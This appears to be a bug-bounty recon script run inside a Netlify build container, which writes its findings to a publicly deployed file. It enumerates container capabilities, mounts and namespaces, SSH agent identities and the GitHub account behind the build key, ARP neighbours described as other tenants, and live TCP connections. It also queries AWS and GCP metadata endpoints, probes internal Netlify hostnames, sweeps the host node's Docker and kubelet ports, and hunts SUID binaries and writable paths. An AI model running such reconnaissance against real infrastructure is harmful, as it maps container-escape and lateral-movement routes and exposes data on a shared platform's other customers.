#!/usr/bin/env bash
# H1 build-container recon v5 — MATERIALLY deeper than v4.
# Covers the axes v4 never tested: SSH key/agent identity + whose GitHub identity it carries,
# capabilities / namespaces / mounts (privesc + escape foundation), L2 neighbors (/proc/net/arp
# = other tenants' builds on the same node), active TCP connections (the control-plane the build
# phones home to), in-scope internal hosts from INSIDE the build, IMDSv2/GCP proper retry,
# FEATURE_FLAGS extracted hostnames only, SUID/SGID + writable-path hunt.
# Read-only, RoE-clean, low-and-slow. Researcher: abedalaziz123sayed.
# EXFIL DISCIPLINE (hard): NEVER write a full secret/key/token VALUE to public/. Only identity,
# scope, fingerprints, hostnames, codes, lengths, prefixes. Full key/token material stays in build.
set +e
PUB="public/recon5.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
UA="abedalaziz123sayed-h1-research"
API="https://api.netlify.com/api/v1"
p "=====RECON5 START====="

p "## identity"
p "id=$(id)"
p "uname=$(uname -a)"
p "os-release=$(head -3 /etc/os-release 2>/dev/null | tr '\n' '|')"

p "## container runtime / namespaces"
p "proc1_cmdline=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null)"
p "proc1_cgroup=$(cat /proc/1/cgroup 2>/dev/null | tr '\n' '|')"
p "self_cgroup=$(cat /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
p "uid_map=$(cat /proc/self/uid_map 2>/dev/null | tr '\n' '|')"
p "gid_map=$(cat /proc/self/gid_map 2>/dev/null | tr '\n' '|')"
p "gvisor_dir=$([ -d /gvisor ] && echo present || echo absent)"
CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
CAPBND=$(grep CapBnd /proc/self/status 2>/dev/null | awk '{print $2}')
p "CapEff=$CAPEFF CapBnd=$CAPBND"
p "capsh=$(command -v capsh >/dev/null && capsh --print 2>/dev/null | head -4 | tr '\n' '|' || echo no-capsh)"
p "## mounts (non-proc, looking for host paths / rw / sensitive)"
grep -E ' / |/opt|/etc|/var|/tmp|/root|/home|/run ' /proc/self/mountinfo 2>/dev/null \
  | awk '{print "  "$5" "$6" ["$7"]"}' | head -40 >> "$PUB"

p "## ssh identity (fingerprints/identity ONLY, never key material)"
ls -la ~/.ssh 2>/dev/null >> "$PUB"
p "ssh_config_exists=$([ -f ~/.ssh/config ] && echo yes || echo no)"
p "gitconfig (redacted):"
sed -E 's#(://[^/]+@)#://REDACTED@#g' ~/.gitconfig 2>/dev/null >> "$PUB"
p "SSH_AUTH_SOCK=$SSH_AUTH_SOCK  GIT_SSH_COMMAND=$GIT_SSH_COMMAND"
p "ssh-add -l (fingerprints only):"
ssh-add -l 2>&1 | head -10 >> "$PUB"
# CRITICAL test: whose github identity does the build's SSH key represent? (identity string only)
GITID=$(ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=6 -T git@github.com 2>&1 | head -c 300)
p "github_identity=$(printf '%s' "$GITID" | tr -d '\n')"
p "known_hosts hostnames:"
awk '{print $1}' ~/.ssh/known_hosts 2>/dev/null | tr ',' '\n' | sort -u | head -20 >> "$PUB"

p "## network: L2 neighbors (cross-tenant) + routes + dns + active connections"
p "## /proc/net/arp:"; cat /proc/net/arp 2>/dev/null >> "$PUB"
p "## /proc/net/route:"; cat /proc/net/route 2>/dev/null >> "$PUB"
p "## /etc/hosts:"; cat /etc/hosts 2>/dev/null >> "$PUB"
p "## /etc/resolv.conf:"; cat /etc/resolv.conf 2>/dev/null >> "$PUB"
# decode active TCP connections -> reveals the control-plane endpoint the build phones home to
python3 - <<'PY' >> "$PUB"
import struct
st={1:'EST',2:'SYN',6:'TWAIT',10:'LISTEN',8:'CLOSEW'}
def dec(a):
    try:
        h,p=a.split(':'); ip=struct.pack('<I',int(h,16))
        return f'{ip[3]}.{ip[2]}.{ip[1]}.{ip[0]}:{int(p,16)}'
    except: return '?:'+a
print("## /proc/net/tcp (local -> remote, state):")
try:
    for ln in open('/proc/net/tcp').read().splitlines()[1:]:
        f=ln.split()
        print(f"  {dec(f[1])} -> {dec(f[2])} state={st.get(int(f[3],16),f[3])} uid={f[7]}")
except Exception as e: print("  tcp_err",e)
PY

p "## FEATURE_FLAGS extracted URLs/hostnames (raw 9.4KB blob NOT exfiled)"
printf '%s' "$FEATURE_FLAGS" | grep -oE 'https?://[a-zA-Z0-9._-]+|[a-z0-9-]+\.(netlify\.com|nsvcs\.net|netlify\.app|internal\.net)' 2>/dev/null | sort -u | head -40 >> "$PUB"

p "## IMDS / metadata retry (proper PUT for v2)"
IMDSTOK=$(curl -s --max-time 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null)
p "aws_imdsv2_token_len=${#IMDSTOK}"
[ -n "$IMDSTOK" ] && p "aws_imds_dir=$(curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $IMDSTOK" http://169.254.169.254/latest/meta-data/ 2>/dev/null | tr '\n' '|')"
p "gcp_meta_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null)"

p "## in-scope internal endpoints from INSIDE the build (single light probes)"
code(){ curl -s -k -o /dev/null -w '%{http_code}' --max-time 5 "$1" 2>/dev/null; }
p "internal.netlify.com code=$(code https://internal.netlify.com/) resolve=$(getent hosts internal.netlify.com 2>/dev/null | head -1)"
p "nf-server-api.services-prod.nsvcs.net resolve=$(getent hosts nf-server-api.services-prod.nsvcs.net 2>/dev/null | head -1)"
for h in api.infra-prod.nsvcs.net build.infra-prod.nsvcs.net buildbot.infra-prod.nsvcs.net orchestration.infra-prod.nsvcs.net deploys.infra-prod.nsvcs.net; do
  p "  $h resolve=$(getent hosts $h 2>/dev/null | head -1) code=$(code https://$h/)"
done
HN="$HOST_NODE_IP"
p "## host node $HN port sweep (single GET each):"
for pt in 80 443 2375 2376 8080 9090 10250 10255 4194 9100 6443; do
  p "  ${HN}:${pt}=$(code http://${HN}:${pt})"
done

p "## SUID/SGID (privesc surface)"
find / -xdev \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -30 >> "$PUB"
p "## world-writable dirs in sensitive areas"
find /etc /opt /usr/local -xdev -writable -type d 2>/dev/null | head -20 >> "$PUB"
p "etc_hosts_writable=$([ -w /etc/hosts ] && echo YES || echo no) resolv_writable=$([ -w /etc/resolv.conf ] && echo YES || echo no)"

p "=====RECON5 END====="
cat "$PUB"
